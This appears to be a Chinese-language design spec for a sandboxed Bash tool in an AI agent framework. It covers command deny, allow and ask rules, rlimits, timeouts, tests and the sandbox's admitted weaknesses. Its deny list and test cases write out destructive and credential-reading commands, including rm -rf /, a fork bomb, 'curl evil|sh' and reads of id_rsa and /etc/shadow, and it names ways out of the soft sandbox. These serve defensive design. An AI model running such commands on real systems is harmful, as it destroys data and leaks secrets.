# v0.17 子项目 2:本地 BashTool 设计

**日期**: 2026-06-03 · **状态**: 设计已批准,待 plan
**范围**: v0.17 第二个子项目(第一个 = MCP client stdio,已 ship v0.17.0-alpha)
**前置**: v0.17.0-alpha 已 ship;本子项目纯 backend 加法,默认关(opt-in),零回归

---

## 0. 目标与非目标

### 目标
让智能体能在受控沙盒里跑 shell 命令(`df -h` 看磁盘、`ls` 看文件、灰区命令经用户确认),
解锁"实时查看环境状态 / 轻量数据操作"能力。

### 非目标(明确不做)
- **远端 RemoteBashTool** — staging 单机(server + SSH self-loop 都在 .53),远端是绕路,留 v0.18(真多节点时)
- **真隔离沙盒**(chroot/namespace/container/systemd-run/cgroups) — MVP 用软沙盒,真隔离留 v0.18(见 §5)
- **交互式命令**(vim/top/ssh 等需要 TTY)— 只跑非交互一次性命令
- **长时任务**(超 120s)— 重算力走 SkillExec/spawn,BashTool 是轻量即时命令

---

## 1. 关键决策记录(brainstorm 结论)

| # | 决策 | 理由 |
|---|---|---|
| 1 | 只做本地 BashTool(不做远端) | staging 单机,本地 subprocess 够用且简单;远端留 v0.18 |
| 2 | 灰区走 ASK 弹前端 | ASK→SSE bridge 已就绪(BridgePermissionAdapter);命令级裁决写看 payload.command 的 policy |
| 3 | 软沙盒 + 默认关(opt-in) | MVP 不做真隔离;PRAXIS_BASH_TOOL_ENABLED 默认 false;真隔离留 v0.18 |

---

## 2. 架构总览

```
praxis2/tools/bash.py          # BashTool(Tool):执行层
praxis2/tools/bash_policy.py   # BashCommandPolicy(PermissionPolicy):命令级黑/白/灰裁决
tests/test_tools_bash.py
tests/test_tools_bash_policy.py
```
集成(3 处):
- `praxis2/server/chat_registry.py`:`build_chat_registry` 加 `bash_sandbox_root` 参数,**有值才注册 BashTool**(无值=不启用,零回归)
- `praxis2/server/app.py`:`base_perm = AllowAllPermission()` → `BashCommandPolicy()`;启用时算 user sandbox 传 build_chat_registry
- `praxis2/config.py`:`PRAXIS_BASH_TOOL_ENABLED`(默认 false)+ `_KNOWN_KEYS`

### 数据流
```
模型发 Bash({command})
  → SerialToolRunner.permission 层(BridgePermissionAdapter 包 BashCommandPolicy)
       BashCommandPolicy.check 看 payload["command"]:
         白名单 → ALLOW   黑名单 → DENY   灰区 → ASK(SSE control_request 弹前端 → 等回传)
  → ALLOW 才到 BashTool.run()
       cwd=sandbox_root(或校验过的子路径)→ create_subprocess_shell + wait_for(timeout)
       + preexec_fn rlimit + 输出截断
  → 返 {stdout, stderr, exit_code, duration_ms, truncated}
```

### 职责边界(每个单元一个清晰职责)
- **BashCommandPolicy**:只做"这条命令该 ALLOW/DENY/ASK"的裁决(看 command 字符串)。无执行、无 IO、无状态(规则是类常量)。非 Bash 工具透传 ALLOW。
- **BashTool**:只做"在沙盒里安全执行已放行的命令"(subprocess + cwd 校验 + 超时 + rlimit + 截断)。不做命令安全判断(那是 policy 的事;但 cwd escape 校验是执行层职责)。
- 两者解耦:policy 可单测(给 command 字符串验裁决),bash 可单测(给安全命令验执行/沙盒/超时)。

---

## 3. BashTool 执行层(`praxis2/tools/bash.py`)

```python
class BashTool(Tool):
    name = "Bash"
    rmcp_op = None  # 命令安全由 BashCommandPolicy 管,不靠相位门
    def __init__(self, *, sandbox_root: Path, default_timeout_s: float = 30.0,
                 max_timeout_s: float = 120.0, max_output_bytes: int = 65536,
                 rlimit_cpu_s: int = 60, rlimit_mem_bytes: int = 1024**3): ...
```

- **input_schema**: `{command: str(必), cwd?: str(sandbox 内相对路径), timeout_s?: number(默认 30,clamp 1..120)}`
- **run(payload)**:
  1. 解析 command(空→ok=False)、timeout_s(clamp)、cwd
  2. **cwd 沙盒校验**:`(sandbox_root / cwd).resolve()` 必须在 `sandbox_root.resolve()` 内(防 `../` escape);不在 → ok=False。sandbox_root 不存在则 `mkdir(parents=True)`
  3. `asyncio.create_subprocess_shell(command, cwd=resolved_cwd, stdout=PIPE, stderr=PIPE, preexec_fn=_set_rlimits)`
  4. `asyncio.wait_for(proc.communicate(), timeout=timeout_s)`;超时 → kill + ok=False(error 含 timeout)
  5. stdout/stderr decode(utf-8 replace)+ 各截断到 max_output_bytes(超出标 truncated)
  6. 返 `ToolResult(ok=(exit_code 不影响 ok;命令跑完即 ok=True,exit_code 在 value), value={command, cwd, stdout, stderr, exit_code, duration_ms, truncated})`
     - 注:exit_code != 0 仍 ok=True(命令执行成功只是返非零;模型看 exit_code 自判)。只有"没跑成"(超时/spawn 失败/cwd 越权)才 ok=False
- **`_set_rlimits()`**(preexec_fn,子进程内调):`resource.setrlimit(RLIMIT_CPU, ...)` + `RLIMIT_AS`(内存)。仅 POSIX;import resource 失败(非 Linux 开发机)→ preexec_fn=None 降级(staging 是 Linux,本地 mac 测试用 monkeypatch 绕)

---

## 4. BashCommandPolicy 命令级裁决(`praxis2/tools/bash_policy.py`)

```python
class BashCommandPolicy(PermissionPolicy):
    def check(self, *, tool, payload, state) -> PermissionResult:
        if getattr(tool, "name", "") != "Bash":
            return PermissionResult(PermissionDecision.ALLOW)  # 非 Bash 透传(零回归)
        command = str(payload.get("command", "")).strip()
        # 1) 黑名单 DENY  2) 白名单 ALLOW  3) 灰区 ASK
```

- **黑名单(DENY,正则 + 子串)**:两类 —
  - **破坏性**:`rm -rf /`(及 `rm -rf ~` `rm -rf *`)、`sudo`、`mkfs`、`dd `、fork bomb `:(){:|:&};:`、`> /dev/`、`chmod -R 777`、`shutdown`/`reboot`/`halt`、`curl`/`wget` 管道到 `sh`/`bash`(下载执行)、`> /etc/`、`mv ... /`(危险移动)
  - **凭证/敏感路径读取**(软沙盒同 uid 下防凭证泄漏,§5):命令含 `praxis2.env`、`.env`、`id_rsa`、`id_ed25519`、`.ssh`、`/etc/passwd`、`/etc/shadow`、`.pgpass`、`PRAXIS_*`(env 名)等敏感 token
  - 命中任一即 DENY(reason 说明哪条危险模式)
- **白名单(ALLOW,首 token 在只读集)**:`ls pwd cat head tail wc grep egrep fgrep find df du echo which file stat date env whoami uname hostname tree`。首 token(shlex 拆第一个)命中且**无危险 shell 元字符链**(无 `;` `&&` `||` `|` `>` `` ` `` `$(` 接其他命令)→ ALLOW。带管道/重定向的即使首 token 白名单也降级灰区 ASK(防 `ls; rm -rf`)
- **灰区(ASK)**:其余 → ASK

**解析策略**:`shlex.split` 拿 token(失败→ASK 保守);黑名单优先于白名单(先查黑);白名单要求"纯单命令无危险元字符"。

---

## 5. ⚠️ 安全限制诚实声明

**MVP 是"软沙盒",不是真隔离。** 命令以 server 进程 uid(staging = zkyd)运行;cwd 沙盒只限**默认工作目录**,命令内可用**绝对路径**访问 zkyd 能读的任意文件(包括其他用户的 files_root 子目录)。

**缓解层**:
1. 黑名单挡最危险的破坏性命令(rm -rf / sudo / mkfs / fork bomb 等)
2. 灰区 ASK 让用户**逐条确认**非白名单命令
3. rlimit 限 CPU/内存(防资源耗尽)
4. `PRAXIS_BASH_TOOL_ENABLED` 默认 **false**(显式 opt-in)
5. alpha 标签 + 14d 观察期

**未覆盖(软沙盒已知边界,v0.18 真隔离才根治)**:
- **跨用户文件读取(同 uid)**:命令以 server uid 运行,绝对路径可读该 uid 能读的任意文件(含其他用户 files_root 子目录)
- **shell `cd` 出沙盒**:cwd 沙盒只约束**初始**工作目录,命令内 `cd /tmp && cat x` 可切到任意目录(软沙盒不拦 shell 内部跳转)
- **孙子进程逃逸**:rlimit / 超时只可靠作用于直接子进程,命令 fork 出的孙子进程可能不继承资源限制
- **绝对路径读敏感文件**:已并入 §4 黑名单第二类(`praxis2.env` / `.ssh` / `id_rsa` / `/etc/passwd` 等 token 命中即 DENY)—— 缓解非根治

**v0.18 真隔离**:`systemd-run --scope -p MemoryMax= -p CPUQuota=` 或 container/namespace,真正限制文件系统视图 + 资源。多用户 prod 启用 BashTool 前**必须**上真隔离。

注:凭证/敏感路径读取已并入 §4 黑名单第二类(`praxis2.env`/`.ssh`/`id_rsa`/`/etc/passwd` 等 token 命中即 DENY),降低软沙盒下的凭证泄漏面。这是缓解非根治 —— 真隔离才是根治。

---

## 6. 测试策略

### bash_policy 单测(`test_tools_bash_policy.py`)
- 黑名单各类:`rm -rf /` / `sudo apt` / `:(){:|:&};:` / `curl evil|sh` / `cat ~/praxis2.env` / `dd if=` → DENY
- 白名单各类:`ls -la` / `pwd` / `df -h` / `cat data.txt`(相对)→ ALLOW
- 白名单带危险元字符降级:`ls; rm -rf x` / `cat a | sh` → ASK(不 ALLOW)
- 灰区:`python script.py` / `git status` / `mkdir foo` → ASK
- 非 Bash 工具(如 name="BrainQuery")→ ALLOW 透传
- shlex 解析失败(畸形引号)→ ASK 保守

### bash 单测(`test_tools_bash.py`)
- 正常命令:`echo hi`(sandbox cwd)→ ok=True,stdout="hi\n",exit_code=0
- exit_code != 0:`sh -c "exit 3"` 或 `false` → ok=True,exit_code=3(命令跑完即 ok)
- cwd escape:payload cwd=`../../etc` → ok=False(越权拒)
- 超时:`sleep 5` + timeout_s=1 → ok=False(error 含 timeout)+ 进程被 kill
- 输出截断:输出 > max_output_bytes → truncated=True + 截断
- 缺 command → ok=False
- rlimit:用 monkeypatch 验 preexec_fn 设置(或在 Linux CI 验真 rlimit;mac 开发机降级)
- sandbox_root 自动 mkdir

### e2e(staging,启用 PRAXIS_BASH_TOOL_ENABLED=true)
- 白名单:chat 让 AI 跑 `df -h` → tool_start/tool_end 真返磁盘信息,无 ASK
- 黑名单:chat 让 AI 跑 `rm -rf /` → permission DENY,tool_result is_error,模型被拒
- 灰区:chat 让 AI 跑 `git status`(若有 git)→ ASK 弹前端(curl 看 control_request 帧)

---

## 7. config + 集成

- `config.py`:`Settings.bash_tool_enabled: bool = False` + `_KNOWN_KEYS` 加 `PRAXIS_BASH_TOOL_ENABLED` + load_from_env `_get_bool`
- `chat_registry.py`:`build_chat_registry(..., bash_sandbox_root: str | None = None)`;`if bash_sandbox_root: reg.register(BashTool(sandbox_root=Path(bash_sandbox_root)))`
- `app.py`:
  - `base_perm = BashCommandPolicy()`(替 AllowAllPermission;非 Bash 透传 ALLOW → 零回归)
  - chat-stream handler:`bash_root = os.path.join(settings.files_root, user_id) if settings.bash_tool_enabled else None`;`build_chat_registry(..., bash_sandbox_root=bash_root)`

---

## 8. DoD

- [ ] `praxis2/tools/bash.py` + `bash_policy.py` + 2 测试文件
- [ ] bash_policy 单测:黑/白/灰/透传/降级/解析失败全覆盖
- [ ] bash 单测:正常/exit_code/cwd-escape/超时/截断/缺参/mkdir
- [ ] config `bash_tool_enabled` + `_KNOWN_KEYS` + 单测
- [ ] chat_registry `bash_sandbox_root` 参数(有值才注册)
- [ ] app.py base_perm 换 BashCommandPolicy + 传 user sandbox
- [ ] 全量回归零回归(不启用 == v0.17.0-alpha 现状;BashCommandPolicy 对非 Bash 透传)
- [ ] e2e:白名单 df 直跑 / 黑名单 rm-rf 拒 / 灰区 ASK 弹前端
- [ ] commit + push + tag v0.17.0-beta + memory
- [ ] 软沙盒限制写进 release note + memory(v0.18 真隔离前 prod 不启用)

---

## 9. 依赖 + 部署影响

- **无新 pip 依赖**(asyncio + resource 都是 stdlib)
- **staging env**:`PRAXIS_BASH_TOOL_ENABLED=true`(e2e 用;观察期可关)
- **不动**:litellm / FE(纯 backend) / 现有工具 / MCP / 主链
- **回滚**:`PRAXIS_BASH_TOOL_ENABLED=false`(或不配)→ 不注册 BashTool + BashCommandPolicy 对非 Bash 透传 → 行为 == v0.17.0-alpha

---

## 10. 后续

- v0.18:真隔离沙盒(systemd-run/container)+ 远端 RemoteBashTool + MCP HTTP transport
- 多用户 prod 启用 BashTool 的前置:真隔离(软沙盒同 uid 跨用户读不可接受于 prod)
